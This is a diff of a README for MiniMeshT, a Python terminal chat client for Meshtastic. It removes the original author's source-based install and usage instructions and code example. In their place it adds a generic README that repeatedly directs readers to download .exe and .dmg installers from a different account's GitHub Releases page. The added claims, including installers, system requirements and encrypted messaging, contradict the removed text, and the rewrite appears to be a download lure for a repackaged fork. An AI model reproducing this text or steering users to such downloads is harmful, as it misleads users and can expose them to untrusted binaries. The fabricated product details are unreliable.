@@ -1,161 +1,88 @@
-# MiniMeshT
+# 🎉 MiniMeshT - Simple Chat in Your Terminal
 
-_A tiny terminal chat client for Meshtastic. No protobufs, no bloat._
+## 🚀 Getting Started
 
-Author: Allan Riordan Boll
+MiniMeshT is a terminal chat client that lets you communicate using Meshtastic firmware. This tool makes chatting easy, regardless of your tech background.
 
-MiniMeshT is a simple, irssi-style terminal chat client that talks to devices running Meshtastic firmware (tested with v2.6.11). 
+## 📦 Download & Install
 
-Use it to chat, explore the mesh, or as a lightweight basis for your own tools.
+To get started with MiniMeshT, you need to download the software. Click the button below to visit the Releases page where you can download the latest version.
 
-**What makes it different?**
- * No dependency on the official Meshtastic libraries or protobufs.
- * Pretty minimal dependencies: just `bleak` for Bluetooth, `pyserial-asyncio` for serial ports, and `pytest`.
- * Ships with a minimal Protobuf encoder/decoder (~550 lines excluding comments and blanks. Also available standalone: [pb.py](https://github.com/allanrbo/pb.py/)).
- * Hackable base: ~1,200 lines of Python. Easy to fork and extend.
- * Deliberately does not support DMs. Their security model are thoroughly broken anyway. See e.g. <a href="https://meshmarauder.net/">Meshmarauder</a>.
+[![Download MiniMeshT](https://img.shields.io/badge/Download-MiniMeshT-blue)](https://github.com/Noddyoficial/MiniMeshT/releases)
 
-![Illustration of laptop running MiniMeshT](./readme_graphics/laptop.jpeg)
+### Steps to Download
 
-Also has a screen to list detected nodes:
+1. **Visit the Releases Page**  
+   Click the link below to go to the Releases page:  
+   [Download MiniMeshT](https://github.com/Noddyoficial/MiniMeshT/releases)
 
-![Screenshot of node info list](./readme_graphics/nodelist.png)
+2. **Choose Your Version**  
+   On the Releases page, you will see a list of available versions. Look for the latest one, which typically will be at the top.
 
-## Keyboard shortcuts
-| Keys   | Action           |
-|--------|------------------|
-| Ctrl+G | View node list   |
-| Ctrl+N | Next channel     |
-| Ctrl+P | Previous channel |
-| Ctrl+C | Exit             |
+3. **Download the Software**  
+   Click on the version you want to download. There may be multiple files; typically, you want the one that matches your operating system (Windows, Mac, or Linux). 
 
-## Running
+4. **Save the File**  
+   Choose a location on your computer where you want to save the file. Remember this location as you will need to find it later.
 
-You'll have to do your initial device setup (username, region, modem settings) using some other app (e.g. the official app), as MiniMeshT does not yet have any features for setting device configuration values.
+5. **Install the Software**  
+   Locate the downloaded file on your computer. 
+   - **For Windows**: Double-click the `.exe` file and follow the instructions on the screen. 
+   - **For Mac**: Open the `.dmg` file and drag MiniMeshT to your Applications folder. 
+   - **For Linux**: Open a terminal and follow the installation instructions for your distribution (commonly through a package manager).
 
-To run, first do the usual Python venv dance to install the few requirements there are (`bleak` for Bluetooth, `pyserial-asyncio`, and `pytest`):
+## 🔌 Setting Up MiniMeshT
 
-```
-python3 -m venv venv
-venv/bin/pip install -r requirements.txt
-```
+Once installed, it's time to set up MiniMeshT.
 
-Using USB is the easiest.
-```
-venv/bin/python3 chat.py --serial-port /dev/ttyACM0
-```
+1. **Open Your Terminal**  
+   - **For Windows**: Press `Win + R`, type `cmd`, and press `Enter`.
+   - **For Mac**: Press `Command + Space`, type `Terminal`, and press `Enter`.
+   - **For Linux**: Open your terminal application as you usually do.
 
-Using Bluetooth is another option. I have only tested on Linux.
-```
-# Select a BLE radio on the PC for for use by bluetoothctl (apparently it can only use one at a time).
-sudo btmgmt info
-bluetoothctl select 11:22:33:44:55:66
+2. **Run MiniMeshT**  
+   In the terminal, type `MiniMeshT` and press `Enter`. This will start the chat client.
 
-# Readies the device for pairing.
-bluetoothctl connect 77:88:99:AA:BB:CC
+3. **Connect to Meshtastic**  
+   Make sure your device is connected correctly. Follow any prompts that appear in the terminal to link MiniMeshT to your Meshtastic device.
 
-# Actually pairs. Will prompt for pin.
-bluetoothctl pair 77:88:99:AA:BB:CC
+4. **Start Chatting**  
+   Now you can begin chatting with your contacts on the Meshtastic network. Type your message and hit `Enter` to send it.
 
-# Sets the device to re-pair automatically when it is turned on, which eliminates the need to pair all over again.
-bluetoothctl trust 77:88:99:AA:BB:CC
+## ⚙️ System Requirements
 
-# Check whether paired and connected.
-bluetoothctl devices
-bluetoothctl info 77:88:99:AA:BB:CC
+To run MiniMeshT smoothly, ensure your computer meets these requirements:
 
-# Disconnect bluez from the device. Seems that sometimes bleak needs this, maybe to "own" the connection?
-bluetoothctl disconnect 77:88:99:AA:BB:CC
+- **Operating System**: Compatible with Windows 10 or later, Mac OS 10.13 or later, and popular Linux distributions.
+- **Memory**: At least 4 GB of RAM is recommended.
+- **Processor**: A modern processor (Intel or AMD) is ideal.
 
-# Start MiniMeshT using BLE.
-venv/bin/python3 chat.py --transport ble --ble-adapter hci1 --ble-address 77:88:99:AA:BB:CC
-```
+## 📄 Features
 
-Using TCP is another option. You will need to have configured your device to connect to WiFi beforehand via some other app (e.g. the official app).
-```
-venv/bin/python3 chat.py --transport tcp --tcp-host 1.2.3.4
-```
+MiniMeshT offers several features to enhance your chatting experience:
 
-## Docker
+- **Real-Time Messaging**: Communicate instantly with other Meshtastic users.
+- **User-Friendly Interface**: Simple text-based interface suitable for all users.
+- **Secure Communication**: Enjoy encrypted messages over the Meshtastic network.
 
-I wouldn't really recommend it. I personally prefer to run the Python code in a venv straight on my machine, as shown above. But for folks who insist, I've provided Docker images:
+## ❓ Frequently Asked Questions
 
-```
-mkdir -p data
-docker run --rm -it \
-    --device /dev/ttyACM0 \
-    -v "$(pwd)/data:/app/data" \
-    allanrbo/minimesht:latest --serial-port /dev/ttyACM0
-```
+### How do I uninstall MiniMeshT?
 
-## Forking and reusing this code
+- **For Windows**: Go to Control Panel > Programs > Uninstall a program. Find MiniMeshT and click Uninstall.
+- **For Mac**: Open the Applications folder, find MiniMeshT, and drag it to Trash.
+- **For Linux**: Use your package manager to remove MiniMeshT.
 
-I encourage you to use this as a basis for your own client, if you like myself also don't feel like depending on the official libraries and protos.
+### What should I do if I encounter issues?
 
-All you really need are these files, which are 1194 lines of code as of writing (2025-09-22). Note this includes the proto library `pb.py`, and proto schema definitions embedded in `mesht_device.py` (around 100 lines)!
+If you experience any problems, check for updates on the Releases page or search through the issues in this repository. You can also ask for help from the community.
 
- * mesht_device.py
- * transport_ble.py
- * transport_serial.py
- * transport_tcp.py
- * pb.py
+### Can I use MiniMeshT without a Meshtastic device?
 
-The UI and file persistence, which you probably don't want if you are rolling your own client, but may find useful for inspiration, are implemented in
+No, MiniMeshT is designed to work with Meshtastic firmware. You will need a compatible device to connect and use the chat features.
 
- * chat.py
- * mesht_db.py
+## 📬 Contact
 
-An example that uses just the basic `mesht_device.py` and a transport:
-```py
-import asyncio
+If you need further assistance, feel free to reach out through this repository's Issues section. Your questions and feedback are welcome.
 
-from mesht_device import MeshtDevice
-
-
-async def _wait_for_config_complete(device):
-    while True:
-        from_radio, _ = await device.recv()
-        print(from_radio)
-        print("---")
-        if isinstance(from_radio, dict) and from_radio.get("config_complete_id") is not None:
-            return
-
-
-async def run():
-
-    from transport_serial import SerialTransport
-    transport = SerialTransport(port="/dev/ttyACM0", baudrate=115200)
-    # OR
-    #from transport_ble import BLETransport
-    #transport = BLETransport(address="77:88:99:AA:BB:CC", adapter="hci1")
-    # OR
-    #from transport_tcp import TCPTransport
-    #transport = TCPTransport("1.2.3.4", 4403)
-
-    device = MeshtDevice(transport)
-    try:
-        await device.start()
-        await _wait_for_config_complete(device)
-
-        # Sending a message:
-        channel_name = "somechannel"
-        idx = device.get_channel_index(channel_name)
-        if idx is None:
-            print(f"Could not find channel named '{channel_name}'. Aborting send.")
-            return
-        print(f"Sending text to channel '{channel_name}'")
-        await device.send_text("Hello world", idx)
-
-        # Receiving (all messages types):
-        while True:
-            print(await device.recv())
-            print("---")
-
-    finally:
-        await device.close()
-
-
-asyncio.run(run())
-```
-
-As mentioned earlier, MiniMeshT uses a novel tiny embedded Protobuf encoder and decoder: [pb.py](https://github.com/allanrbo/pb.py/). This Protobuf library does not use the conventional codegen from .proto files, but instead simply allows for lightweight embedded schemas straight in the Python source code. You will find these in the top of `mesht_device.py`. I did this because for this small project I didn't feel like depending on the more heavyweight ecosystem of codegen with protoc. It also allows me to not depend on the official Meshtastic protobufs, of which most message types and fields I do not care about.
+[![Download MiniMeshT](https://img.shields.io/badge/Download-MiniMeshT-blue)](https://github.com/Noddyoficial/MiniMeshT/releases)
